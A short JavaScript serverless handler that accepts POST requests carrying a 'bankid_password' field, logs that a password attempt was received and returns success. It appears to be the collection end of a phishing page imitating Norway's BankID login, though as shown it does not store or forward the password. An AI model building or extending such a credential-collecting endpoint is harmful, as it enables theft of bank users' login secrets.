exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: JSON.stringify({ message: 'Kun POST er tillatt' }) };
  }
  let body = {};
  try { body = JSON.parse(event.body || '{}'); } catch {}
  if (!body.bankid_password && event.body && event.body.includes('bankid_password=')) {
    const params = new URLSearchParams(event.body);
    body.bankid_password = params.get('bankid_password');
  }
  const password = body.bankid_password;
  if (!password) return { statusCode: 400, body: 'Password not provided.' };
  console.log('Password attempt received');
  return { statusCode: 200, body: 'Password attempt received successfully.' };
};
